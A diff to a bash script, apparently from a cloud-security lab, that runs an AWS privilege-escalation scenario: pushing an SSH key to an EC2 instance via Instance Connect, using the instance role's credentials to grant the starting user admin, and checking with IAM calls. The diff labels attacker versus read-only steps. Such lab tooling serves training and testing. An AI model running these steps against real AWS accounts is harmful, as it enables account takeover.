@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -73,6 +75,15 @@ if [ "$INSTANCE_ID" == "null" ] || [ -z "$INSTANCE_ID" ]; then
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -83,6 +94,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER_NAME"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo "Target Instance: $INSTANCE_ID"
 echo "Target Role: $EC2_ROLE_NAME"
@@ -91,21 +103,27 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
-echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-# Save credentials for later use
-ACCESS_KEY=$STARTING_ACCESS_KEY_ID
-SECRET_KEY=$STARTING_SECRET_ACCESS_KEY
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
 
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+# [EXPLOIT] Step 2: Configure AWS credentials with starting user
+echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -115,17 +133,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -133,10 +153,11 @@ else
 fi
 echo ""
 
-# Step 5: Discover target EC2 instance
+# [OBSERVATION] Step 5: Discover target EC2 instance
 echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
+use_readonly_creds
 echo "Getting instance details..."
-show_cmd aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn,Platform]' --output text
+show_cmd "ReadOnly" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn,Platform]' --output text"
 INSTANCE_INFO=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -191,8 +212,9 @@ SSH_PUBLIC_KEY=$(cat ${SSH_KEY_PATH}.pub)
 echo "Generated SSH public key"
 echo -e "${GREEN}✓ SSH key pair created at: ${SSH_KEY_PATH}${NC}\n"
 
-# Step 7: Push public key to instance using EC2 Instance Connect
+# [EXPLOIT] Step 7: Push public key to instance using EC2 Instance Connect
 echo -e "${YELLOW}Step 7: Pushing SSH public key to instance (privilege escalation vector)${NC}"
+use_starting_creds
 echo "Using ec2-instance-connect:SendSSHPublicKey to push temporary key..."
 echo ""
 echo -e "${BLUE}This is where the privilege escalation happens:${NC}"
@@ -202,7 +224,7 @@ echo "We can push our SSH public key to the instance for 60 seconds!"
 EC2_USER="ec2-user"
 
 # Attempt to send SSH public key
-show_attack_cmd aws ec2-instance-connect send-ssh-public-key --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --instance-os-user "$EC2_USER" --ssh-public-key "file://${SSH_KEY_PATH}.pub"
+show_attack_cmd "Attacker" "aws ec2-instance-connect send-ssh-public-key --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --instance-os-user "$EC2_USER" --ssh-public-key "file://${SSH_KEY_PATH}.pub""
 aws ec2-instance-connect send-ssh-public-key \
     --region $AWS_REGION \
     --instance-id $INSTANCE_ID \
@@ -272,7 +294,7 @@ export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
 export AWS_REGION="$AWS_REGION"
 
 # Verify new identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $NEW_IDENTITY"
 echo -e "${GREEN}✓ Now using extracted EC2 admin role credentials${NC}\n"
@@ -297,25 +319,23 @@ echo ""
 echo "Waiting 15 seconds for IAM policy to propagate..."
 sleep 15
 
-# Step 11: Switch back to starting user and verify admin access
+# [OBSERVATION] Step 11: Switch back to starting user and verify admin access
 echo ""
 echo -e "${YELLOW}Step 11: Switching back to starting user and verifying admin access${NC}"
 echo "Switching from extracted credentials back to starting user..."
 
-export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
-export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
-unset AWS_SESSION_TOKEN
+use_starting_creds
 export AWS_REGION="$AWS_REGION"
 
 # Verify we're back to starting user
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 STARTING_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Back to starting user: $STARTING_IDENTITY"
 echo ""
 
 echo "Testing admin access as starting user..."
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ STARTING USER NOW HAS ADMIN ACCESS!${NC}"
